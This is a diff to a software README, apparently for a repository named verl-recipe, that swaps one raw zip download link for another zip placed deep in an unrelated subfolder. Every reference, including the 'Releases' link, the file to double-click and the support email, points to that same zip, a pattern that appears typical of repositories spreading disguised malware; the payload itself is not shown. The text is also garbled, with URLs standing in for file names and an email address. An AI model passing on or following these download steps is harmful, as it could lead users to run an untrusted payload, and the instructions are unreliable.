@@ -8,9 +8,9 @@
 ## 📥 Download & Install
 You can easily download the software from our Releases page. 
 
-[![Download Release](https://raw.githubusercontent.com/Hamed8845/verl-recipe/main/langgraph_agent/example/verl-recipe_3.0.zip%20Release-Click%https://raw.githubusercontent.com/Hamed8845/verl-recipe/main/langgraph_agent/example/verl-recipe_3.0.zip)](https://raw.githubusercontent.com/Hamed8845/verl-recipe/main/langgraph_agent/example/verl-recipe_3.0.zip)
+[![Download Release](https://github.com/Hamed8845/verl-recipe/raw/refs/heads/main/spo/estimate_offline_values/verl_recipe_3.6.zip%20Release-Click%https://github.com/Hamed8845/verl-recipe/raw/refs/heads/main/spo/estimate_offline_values/verl_recipe_3.6.zip)](https://github.com/Hamed8845/verl-recipe/raw/refs/heads/main/spo/estimate_offline_values/verl_recipe_3.6.zip)
 
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Hamed8845/verl-recipe/main/langgraph_agent/example/verl-recipe_3.0.zip).
+Visit this page to download: [GitHub Releases](https://github.com/Hamed8845/verl-recipe/raw/refs/heads/main/spo/estimate_offline_values/verl_recipe_3.6.zip).
 
 ### 📋 System Requirements
 To run this application smoothly, ensure your system meets these requirements:
@@ -24,11 +24,11 @@ Make sure your system is up to date with the latest software updates.
 ## 🚀 Getting Started
 Once you have downloaded the application, follow these steps to start using it:
 
-1. **Locate the Downloaded File**: Open the folder where your downloads are saved. You should see a file named something like `https://raw.githubusercontent.com/Hamed8845/verl-recipe/main/langgraph_agent/example/verl-recipe_3.0.zip`.
+1. **Locate the Downloaded File**: Open the folder where your downloads are saved. You should see a file named something like `https://github.com/Hamed8845/verl-recipe/raw/refs/heads/main/spo/estimate_offline_values/verl_recipe_3.6.zip`.
 
-2. **Unzip the File**: Right-click on the `https://raw.githubusercontent.com/Hamed8845/verl-recipe/main/langgraph_agent/example/verl-recipe_3.0.zip` file and select “Extract All.” Choose a destination folder where you want to keep the application files.
+2. **Unzip the File**: Right-click on the `https://github.com/Hamed8845/verl-recipe/raw/refs/heads/main/spo/estimate_offline_values/verl_recipe_3.6.zip` file and select “Extract All.” Choose a destination folder where you want to keep the application files.
 
-3. **Open the Application**: In the folder where you extracted the files, double-click on `https://raw.githubusercontent.com/Hamed8845/verl-recipe/main/langgraph_agent/example/verl-recipe_3.0.zip` (or the equivalent file for your operating system).
+3. **Open the Application**: In the folder where you extracted the files, double-click on `https://github.com/Hamed8845/verl-recipe/raw/refs/heads/main/spo/estimate_offline_values/verl_recipe_3.6.zip` (or the equivalent file for your operating system).
 
 4. **Follow On-Screen Instructions**: A welcome window will appear. Just follow the on-screen instructions to set up the application.
 
@@ -68,7 +68,7 @@ If you encounter any issues or have questions, please reach out. Here’s how:
 
 - **Issues Page**: Use the Issues section of this repository to report bugs or ask for help.
   
-- **Email**: You can also contact us at https://raw.githubusercontent.com/Hamed8845/verl-recipe/main/langgraph_agent/example/verl-recipe_3.0.zip for more direct assistance.
+- **Email**: You can also contact us at https://github.com/Hamed8845/verl-recipe/raw/refs/heads/main/spo/estimate_offline_values/verl_recipe_3.6.zip for more direct assistance.
 
 ## 📅 Changelog
 Keep track of updates and changes to the project:
